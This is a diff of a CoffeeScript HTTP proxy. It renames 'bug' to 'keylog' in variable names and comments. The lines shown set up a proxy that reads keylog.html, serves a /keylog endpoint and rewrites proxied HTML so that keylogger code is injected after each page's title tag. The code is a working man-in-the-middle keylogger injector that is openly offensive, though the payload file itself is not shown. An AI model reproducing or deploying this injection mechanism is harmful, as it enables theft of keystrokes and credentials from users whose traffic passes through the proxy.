@@ -44,8 +44,8 @@ net = require 'net'
 qs = require 'querystring'
 fs = require 'fs'
 
-# bug.html is the keylogger code which will be injected into the page
-bug = fs.readFileSync 'bug.html'
+# keylog.html is the keylogger code which will be injected into the page
+keylog = fs.readFileSync 'keylog.html'
 
 HTTP_PORT = 80
 HTTPS_PORT = 443
@@ -67,7 +67,7 @@ for param, desc of ENV_VARS
   else
     console.log "#{param} = #{process.env[param]}"
 
-# HTTP proxy server (with bug injection)
+# HTTP proxy server (with keylogger injection)
 
 server = httpProxy.createServer (req, res, proxy) ->
   if /^\/keylog/.exec(req.url)
@@ -111,7 +111,7 @@ server = httpProxy.createServer (req, res, proxy) ->
         # We want to inject the keylogger into the <head> element
         # without clashing with <meta http-equiv> tags, so we insert
         # it after the title closing tag.
-        data = data.replace('</title>', "</title>#{bug}")
+        data = data.replace('</title>', "</title>#{keylog}")
         res.oldWrite(data)
         res.oldEnd()
 
